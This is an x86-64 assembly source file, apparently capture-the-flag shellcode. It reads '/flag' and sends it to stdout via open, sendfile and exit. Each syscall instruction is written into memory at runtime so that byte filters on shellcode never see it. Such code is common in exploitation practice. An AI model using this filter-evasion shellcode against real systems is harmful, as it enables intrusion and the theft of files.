.global _start

_start: 
 # open
 mov $2, %rax
 lea flag(%rip), %rdi
 xor %rsi, %rsi
 lea sys1(%rip), %r15
 movb $0xf, (%r15)
 movb $0x5, 1(%r15)
sys1:
 nop
 nop

 # sendfile to stdout (fd=1)
 mov $1, %rdi
 mov %rax, %rsi
 xor %rdx, %rdx
 mov $0x1000, %r10 
 mov $40, %al
 lea sys2(%rip), %r15
 movb $0xf, (%r15)
 movb $0x5, 1(%r15)
sys2:
 nop
 nop

 # exit
 mov $60, %al
 xor %rdi, %rdi
 lea sys3(%rip), %r15
 movb $0xf, (%r15)
 movb $0x5, 1(%r15)
sys3:
 nop
 nop

flag:
  .string "/flag"
